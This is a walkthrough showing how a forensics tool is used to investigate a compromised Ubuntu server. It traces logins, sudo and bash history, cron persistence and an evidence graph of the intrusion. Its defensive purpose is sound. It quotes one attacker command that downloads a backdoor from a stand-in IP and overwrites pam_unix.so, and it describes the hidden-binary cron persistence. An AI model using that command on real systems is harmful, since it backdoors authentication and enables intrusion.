# Walkthrough: Linux Server Intrusion Investigation

This walkthrough investigates a compromised Linux production server using Forensics Workbench V3. The server runs Ubuntu 22.04 LTS and was flagged after unusual outbound traffic was detected. We import a file-tree image of the server's root filesystem, extract Linux artifacts, trace attacker activity through login records, sudo commands, and cron persistence, and use the evidence graph to reconstruct the intrusion chain.

## 0. Prerequisites

- Forensics Workbench V3 installed
- Evidence: file-tree dump of the compromised server root filesystem (`server-root/`)
- Loaded rule packs: `linux-intrusion-detection`, `persistence-mechanisms`
- Verification config at `<case_root>/verification.toml` with `required_packs = ["linux-intrusion-detection", "persistence-mechanisms"]`

---

## 1. Import the Linux File Tree

1. Create a new case named `Server-Intrusion-2026-06`.
2. Go to **Import > File Tree**. Select the root directory `server-root/`.
3. The catalog phase walks the entire filesystem. On the V3 dashboard, monitor:

```
Import phase: Catalog
  Files cataloged: 1,247,833
  Directories cataloged: 188,402
  Symlinks: 12,407
  Total size: 48.3 GiB
  Duration: 8m 12s
```

4. Enable **Linux artifact extraction** with the following families selected:
   - systemd journal
   - wtmp/utmp/btmp
   - bash history
   - sudo logs (from `/var/log/auth.log`)
   - cron (crontab, cron.d, cron.{hourly,daily,weekly,monthly})
   - apt/dpkg history

5. Also enable **entity extraction** (accounts, hostnames) and **timeline population**.
6. Start the import. The artifact extraction phase runs after cataloging completes and populates the evidence graph with typed Linux artifact nodes.

---

## 2. Timeline of Login Events from wtmp

After import, the wtmp parser produces structured login session records.

1. Go to **Timeline** view. Filter by `Artifact Family = wtmp`.
2. The timeline now shows all login and logout events:

```
TimelineEvent nodes (wtmp): 1,847
  Login events  : 1,204
  Logout events :   643 (some sessions ended abruptly / crashed)

Date range: 2025-09-01 to 2026-06-14
```

3. Zoom into the 72 hours before the incident alert (2026-06-11 to 2026-06-14).
4. Identify anomalous login patterns:

| Timestamp (UTC) | User | Source Host | Type | Signal |
|----------------|------|-------------|------|--------|
| 2026-06-13 22:14:03 | `root` | 198.51.100.47 | SSH | Root login from external IP (unusual — root SSH should be disabled) |
| 2026-06-13 22:14:08 | `www-data` | localhost | su | Privilege escalation from web service account to root (gap: 5 seconds) |
| 2026-06-13 22:16:22 | `operator` | 198.51.100.47 | SSH | Newly-created user account; account did not exist before 22:15 UTC |

5. Click the `root` login event at 22:14:03. The graph neighborhood shows:
   - `DerivesFrom` edge to Entity node `Account: root (UID 0)`
   - `DerivesFrom` edge to Entity node `Device: host 198.51.100.47`
   - `Precedes` edge to the `www-data` su event at 22:14:08
   - `Precedes` edge to bash history entries executed in that session

---

## 3. Correlate Sudo Commands with File Modifications

The sudo log parser extracts every `sudo` invocation from `/var/log/auth.log`, and the bash history parser extracts the full command line from each user's `.bash_history`.

1. Go to **Correlation Workspace**. Run the `linux-intrusion-detection` pack.
2. Filter leads by rule `SudoCommand-to-FileModification`:

```
Correlation leads (SudoCommand-to-FileModification): 47
  Strong  : 31
  Moderate: 12
  Weak    :  4
```

3. **Strong lead example**: sudo command `apt install nginx` executed at 22:15:12 → `CorrelatesWith` edge to file creation events in `/etc/nginx/` at 22:15:23–22:15:45. Confidence: **Strong** (command-line package name, timestamp proximity 11–33s, filesystem path matches package file list).

4. **Strong lead example**: sudo command `useradd -m -s /bin/bash operator` at 22:15:01 → `CorrelatesWith` edge to file modifications in `/etc/passwd`, `/etc/shadow`, `/etc/group`, and `/home/operator/`. Confidence: **Strong** (command explicitly references username, timestamp proximity < 1s, expected files modified).

5. **Moderate lead example**: bash history line `wget hxxp://198.51.100.47/payload/backdoor.so -O /lib/x86_64-linux-gnu/security/pam_unix.so` at 22:17:33 → `CorrelatesWith` edge to file modification of `/lib/x86_64-linux-gnu/security/pam_unix.so` at 22:17:35. Confidence: **Moderate** (path match for destination file, 2s proximity; hash change confirms modification).

6. Run a **Graph Query** to reconstruct the full command sequence:

```json
{
  "startNode": { "nodeId": "artifact:wtmp-session-root-221403" },
  "edgeFilters": ["Precedes"],
  "maxDepth": 10,
  "direction": "forward"
}
```

This traversal chains: SSH login → su to www-data → useradd → apt install → wget backdoor → systemctl enable persistence → logout. The full attack chain is laid out chronologically.

---

## 4. Cron Job Analysis for Persistence

The attacker created cron jobs to maintain access after logout and across reboots.

1. Go to **Artifacts** view. Filter by `Artifact Family = cron`.
2. The cron parser has extracted all cron definitions from the filesystem:

```
Cron artifacts: 34
  User crontabs (/var/spool/cron/crontabs/):  3 entries
  System crontab (/etc/crontab):              2 entries
  cron.d entries (/etc/cron.d/):              8 entries
  cron.hourly scripts:                         6 entries
  cron.daily scripts:                          9 entries
  cron.weekly scripts:                          4 entries
  cron.monthly scripts:                         2 entries
```

3. Filter to entries created after 2026-06-13 22:15 UTC. Two suspicious entries appear:

```
Artifact: cron-042 — /etc/cron.d/system-update
  Schedule: */10 * * * *
  User: root
  Command: /usr/lib/systemd/system-update.sh
  Created: 2026-06-13 22:18:01

Artifact: cron-043 — /var/spool/cron/crontabs/www-data
  Schedule: @reboot
  User: www-data
  Command: /tmp/.cache/initd --daemon 2>&1 >/dev/null
  Created: 2026-06-13 22:18:45
```

4. Click `cron-042` and inspect its graph neighborhood:
   - `References` edge to `File: /etc/cron.d/system-update` (the cron definition file)
   - `CorrelatesWith` edge to `File: /usr/lib/systemd/system-update.sh` (the script file) — Confidence: **Strong**
   - `Precedes` edge to TimelineEvent for the first scheduled execution (estimated at 22:20:00 based on `*/10` schedule)

5. The `@reboot` cron for `www-data` running a hidden binary from `/tmp/.cache/` is a classic persistence indicator. The dot-prefixed directory name is an evasion technique (hidden from default `ls`).

6. Run the `persistence-mechanisms` rule pack to systematically identify all persistence indicators:

```
Correlation complete: 12 leads
  Strong  :  9
  Moderate:  3

Persistence mechanism leads:
  cron-suspicious-schedule (root every 10 min): 1
  cron-hidden-path (/tmp/.cache):               1
  cron-reboot-trigger (@reboot):                1
  systemd-service-newly-created:                3
  ssh-authorized-keys-modified:                 2
  bashrc-profile-modified:                      2
  pam-module-replaced:                          2
```

---

## 5. Graph Query to Trace the Attacker Activity Chain

The V3 evidence graph ties everything together. Run a comprehensive traversal to produce the full intrusion timeline.

1. Open the **Correlation Workspace** and switch to the **Graph Explorer** tab.
2. Start from the initial SSH login and trace forward through all activity:

```json
{
  "startNode": { "nodeId": "artifact:wtmp-session-root-221403" },
  "edgeFilters": ["Precedes", "CorrelatesWith", "References"],
  "maxDepth": 12,
  "confidenceFloor": "Moderate"
}
```

3. The resulting subgraph shows the complete attacker chain:

```
[SSH Login: root@198.51.100.47] 22:14:03
   │ Precedes
   ▼
[su: root → www-data] 22:14:08
   │ Precedes
   ▼
[bash: useradd operator] 22:15:01
   │ CorrelatesWith (Strong)
   ▼
[File: /etc/passwd modified] 22:15:01
   │ Precedes
   ▼
[bash: apt install nginx] 22:15:12
   │ CorrelatesWith (Strong)
   ▼
[File: /etc/nginx/* created] 22:15:23
   │ Precedes
   ▼
[bash: wget backdoor.so → pam_unix.so] 22:17:33
   │ CorrelatesWith (Moderate)
   ▼
[File: /lib/.../pam_unix.so modified] 22:17:35
   │ Precedes
   ▼
[bash: systemctl enable backdoor-service] 22:17:50
   │ Precedes
   ▼
[cron: /etc/cron.d/system-update created] 22:18:01
   │ Precedes
   ▼
[cron: /var/spool/cron/crontabs/www-data created] 22:18:45
   │ Precedes
   ▼
[SSH Logout: root] 22:19:12
```

4. Document the full chain in the **Case Notebook** as a **Finding** entry, citing each node.
5. The investigation is now ready for export as a structured report.

---

## Quick Reference: Linux Intrusion Flow

```
Import File Tree → Catalog (1.2M files)
      │
      ▼
Extract Linux Artifacts (systemd journal, wtmp, bash history, sudo, cron, apt)
      │
      ▼
Timeline → Filter wtmp login events → Identify anomalous root SSH from external IP
      │
      ▼
Correlate Sudo → File modifications (useradd → /etc/passwd, apt → /etc/nginx, wget → pam)
      │
      ▼
Cron Analysis → Detect persistence (every-10-min backdoor, @reboot covert binary)
      │
      ▼
Graph Query → Full attack chain traversal (SSH → su → useradd → install → backdoor → persist)
      │
      ▼
Notebook → Document chain with cited evidence
      │
      ▼
Export → Report with intrusion timeline, persistence details, and IOC list
```

---

*Walkthrough 03-Linux-Server-Intrusion version 1.0. Last updated: 2026-06-15.*
